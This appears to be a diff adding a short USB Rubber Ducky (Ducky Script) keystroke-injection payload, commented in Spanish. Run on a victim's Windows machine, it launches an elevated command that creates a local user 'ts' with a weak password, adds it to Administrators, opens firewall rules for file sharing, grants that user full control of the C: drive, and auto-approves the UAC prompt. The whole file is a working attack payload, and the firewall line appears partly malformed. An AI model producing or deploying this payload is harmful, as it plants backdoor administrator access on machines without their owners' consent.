@@ -1,0 +1,9 @@
+REM One liner que añade el usuario ts (con contraseña ts) al grupo de admins
+REM Y comparte el disco C
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -Exec Bypass "saps cmd '/C net User ts ts /ADD&net LocalGroup Administrators ts /ADD&netsh advfirewall firewall set rule group="""File and Printer UNLIMITED&icacls c:\* /grant ts:(OI) (CI)F' -Verb RunAs"
+ENTER
+DELAY 1000
+ALT y
